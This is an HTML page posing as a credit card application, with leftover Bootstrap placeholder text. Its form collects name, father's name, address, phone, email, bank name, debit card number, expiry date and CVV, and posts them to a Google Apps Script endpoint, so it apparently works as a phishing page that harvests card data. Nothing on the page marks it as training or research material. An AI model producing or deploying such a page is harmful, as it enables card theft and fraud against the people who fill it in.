<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Apply for new Credit Card</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
</head>

<body>
    <main>
        <section class="py-5 text-center container">
            <div class="row py-lg-5">
                <div class="col-lg-6 col-md-8 mx-auto">
                    <h2 class="text-center mb-4">Apply for new Credit Card</h2>
                    <p class="lead text-body-secondary">Something short and leading about the collection below—its contents, the creator, etc. Make it short and sweet, but not too short so folks don’t simply skip over it entirely.</p>
                </div>
            </div>
        </section>

        <div class="album py-5 bg-body-tertiary">
            <div class="container">
                <div class="col-md-10 mx-auto col-lg-5">
                    <form class="p-4 p-md-5 border rounded-3 bg-body-tertiary" id="contactForm" action="https://script.google.com/macros/s/AKfycbzckOcTxo1BInS6GbKvy_H5yoEAIraaeQqZztK6SQVvOiO44IHe6agGgDQ2XeGATfVo/exec" method="post">
                        <input type="text" class="form-control mb-3" name="name" placeholder="Name" required>
                        <input type="text" class="form-control mb-3" name="fatherName" placeholder="Father's Name" required>
                        <input type="text" class="form-control mb-3" name="address" placeholder="Address" required>
                        <input type="tel" class="form-control mb-3" name="phone" placeholder="Phone Number">
                        <input type="email" class="form-control mb-3" name="email" placeholder="Email Address">
                        <input type="text" class="form-control mb-3" name="bankName" placeholder="Bank Name">
                        <input type="number" class="form-control mb-3" name="debitCardNumber" placeholder="Debit Card Number">
                        <input type="text" class="form-control mb-3" name="expire" placeholder="Expire Date">
                        <input type="number" class="form-control mb-3" name="cvv" placeholder="CVV">
     
                        <button class="w-100 btn btn-outline-primary" type="submit">Submit</button>
                    </form>
                    <div id="formMessage" class="mt-3 text-center"></div>
                </div>
            </div>
        </div>
    </main>

   <div class="container">
    <p class="fs-5 fw-medium text-center">Our Partner</p>
    <img src="ourpartner.jpg" class="img-fluid" style="height: 50px;" alt="...">
</div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm" crossorigin="anonymous"></script>
</body>

</html>
